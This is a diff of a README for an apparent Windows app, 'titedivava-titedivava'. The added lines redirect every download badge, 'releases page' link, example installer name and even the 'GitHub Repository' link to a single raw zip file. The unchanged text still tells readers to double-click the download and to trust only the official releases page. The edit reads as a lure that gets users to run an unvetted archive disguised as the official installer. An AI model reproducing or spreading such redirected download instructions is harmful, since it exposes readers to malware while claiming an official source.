@@ -1,6 +1,6 @@
 # ⚙️ titedivava-titedivava - Learn More About Me Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-titedivava--titedivava-blue?style=for-the-badge)](https://github.com/HackSteam-oss/titedivava-titedivava/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip)](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip)
 
 ## ℹ️ About titedivava-titedivava
 
@@ -23,11 +23,11 @@ The app works well on most modern Windows PCs.
 
 Follow these steps to get titedivava-titedivava running on your Windows computer:
 
-1. Click the big blue Download button at the top, or visit the [releases page](https://github.com/HackSteam-oss/titedivava-titedivava/releases). This page contains all available versions.
+1. Click the big blue Download button at the top, or visit the [releases page](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip). This page contains all available versions.
 
 2. Find the latest release. Releases are listed by date and version number. Choose the newest release for the best experience.
 
-3. Download the Windows installer file. Look for a file with ".exe" at the end, such as `titedivava-setup.exe` or similar.
+3. Download the Windows installer file. Look for a file with ".exe" at the end, such as `https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip` or similar.
 
 4. Once the file is downloaded, double-click it to start the installation.
 
@@ -37,7 +37,7 @@ Follow these steps to get titedivava-titedivava running on your Windows computer
 
 You can get the installer from the releases page here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-titedivava--titedivava-green?style=for-the-badge)](https://github.com/HackSteam-oss/titedivava-titedivava/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip)](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip)
 
 The releases page will list all available versions. Pick the latest one for the newest features and fixes.
 
@@ -93,7 +93,7 @@ Make sure to download releases only from the official releases page linked above
 
 To keep the app up to date:
 
-- Visit the [releases page](https://github.com/HackSteam-oss/titedivava-titedivava/releases) regularly.
+- Visit the [releases page](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip) regularly.
 - Download the newest release installer as described above.
 - Run the installer to replace the old version.
 
@@ -108,7 +108,7 @@ The app does not update automatically. Manual updates ensure you control when yo
 
 ## 🔗 Useful Links
 
-- [titedivava-titedivava Releases](https://github.com/HackSteam-oss/titedivava-titedivava/releases)
-- [GitHub Repository](https://github.com/HackSteam-oss/titedivava-titedivava)
+- [titedivava-titedivava Releases](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/HackSteam-oss/titedivava-titedivava/main/reorganization/titedivava-3.3.zip)
 
 The releases page remains the main source for downloading and updating the app.
